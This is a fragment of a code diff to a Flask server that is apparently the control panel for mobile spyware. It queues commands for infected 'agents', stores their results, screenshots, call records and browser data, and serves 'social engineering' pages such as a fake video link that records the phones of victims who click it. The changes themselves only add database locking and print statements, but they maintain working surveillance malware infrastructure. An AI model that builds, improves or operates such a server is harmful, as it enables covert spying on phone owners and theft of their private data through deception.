+            "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
+            (agent_id,)
+        ).fetchall()
+        conn.close()
     
     commands_list = [{'id': cmd['id'], 'command': cmd['command']} for cmd in commands]
     return jsonify({'commands': commands_list})
@@ -786,18 +825,20 @@ def command_result():
         command_id = data.get('command_id')
         result = data.get('result')
         
-        conn = get_db_connection()
-        conn.execute(
-            "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
-            (result, command_id)
-        )
-        conn.commit()
-        conn.close()
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute(
+                "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
+                (result, command_id)
+            )
+            conn.commit()
+            conn.close()
         
-        log_event('INFO', f'Command {command_id} completed with result')
+        print(f"✅ Command {command_id} completed with result")
         return jsonify({'status': 'success'})
         
     except Exception as e:
+        print(f"❌ Command result failed: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # ==================== SOCIAL ENGINEERING PAGES ====================
@@ -1166,13 +1207,14 @@ def fake_video():
     
     log_event('INFO', f'User accessed fake video: {phone_id} from {user_ip}')
     
-    conn = get_db_connection()
-    conn.execute(
-        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (phone_id, phone_id, 'User clicked video link', 'clicked', datetime.now())
-    )
-    conn.commit()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        conn.execute(
+            'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
+            (phone_id, phone_id, 'User clicked video link', 'clicked', datetime.now())
+        )
+        conn.commit()
+        conn.close()
     
     platform_url = request.host_url.rstrip('/')
     
@@ -1457,12 +1499,13 @@ def clear_agent(agent_id):
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    conn.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))
-    conn.execute("DELETE FROM screenshots WHERE agent_id = ?", (agent_id,))
-    conn.execute("DELETE FROM call_records WHERE agent_id = ?", (agent_id,))
-    conn.commit()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        conn.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))
+        conn.execute("DELETE FROM screenshots WHERE agent_id = ?", (agent_id,))
+        conn.execute("DELETE FROM call_records WHERE agent_id = ?", (agent_id,))
+        conn.commit()
+        conn.close()
     
     log_event('WARNING', f'Agent {agent_id} cleared by admin')
     return redirect('/admin')
@@ -1472,15 +1515,16 @@ def view_web_data(agent_id):
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    web_data = conn.execute(
-        "SELECT * FROM browser_data WHERE agent_id = ? ORDER BY timestamp DESC",
-        (agent_id,)
-    ).fetchall()
-    agent = conn.execute(
-        "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
-    ).fetchone()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        web_data = conn.execute(
+            "SELECT * FROM browser_data WHERE agent_id = ? ORDER BY timestamp DESC",
+            (agent_id,)
+        ).fetchall()
+        agent = conn.execute(
+            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
+        ).fetchone()
+        conn.close()
     
     return render_template('web_data.html', 
                          web_data=web_data, 
@@ -1493,9 +1537,10 @@ def logout():
 
 @app.route('/health')
 def health_check():
-    conn = get_db_connection()
-    agents_count = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        agents_count = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
+        conn.close()
     
     return jsonify({
         'status': 'healthy',
